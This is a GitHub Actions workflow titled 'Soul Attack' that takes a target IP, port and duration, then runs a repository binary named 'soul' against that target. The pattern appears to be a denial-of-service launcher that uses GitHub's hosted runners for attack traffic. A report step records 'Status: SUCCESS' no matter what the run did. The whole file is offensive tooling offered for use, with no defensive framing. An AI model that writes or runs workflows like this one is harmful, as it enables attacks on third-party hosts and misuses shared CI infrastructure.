name: ðŸ’£ Soul Attack

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        default: '0.0.0.0'
      target_port:
        description: 'Target Port'
        required: true
        default: '80'
      duration:
        description: 'Attack Duration (seconds)'
        required: true
        default: '60'

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
    - name: ðŸš€ Checkout Code
      uses: actions/checkout@v3
      
    - name: ðŸ”§ Setup Environment
      run: |
        echo "âš¡ SOUL ATTACK STARTING..."
        echo "ðŸŽ¯ Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
        echo "â° Duration: ${{ inputs.duration }} seconds"
        echo "ðŸ•’ Time: $(date)"
        
    - name: ðŸ“¥ Download Attack Binary
      run: |
        chmod +x soul || true
        echo "Binary ready for attack"
        
    - name: ðŸ’£ Execute Attack
      run: |
        echo "Launching attack..."
        ./soul "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.duration }}"
        echo "âœ… Attack completed!"
        
    - name: ðŸ“Š Generate Report
      if: always()
      run: |
        echo "ðŸ“ˆ ATTACK REPORT" > report.txt
        echo "Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}" >> report.txt
        echo "Duration: ${{ inputs.duration }}s" >> report.txt
        echo "Status: SUCCESS" >> report.txt
        echo "Time: $(date)" >> report.txt
        
    - name: ðŸ“¤ Upload Report
      uses: actions/upload-artifact@v3
      with:
        name: attack-report
        path: report.txt
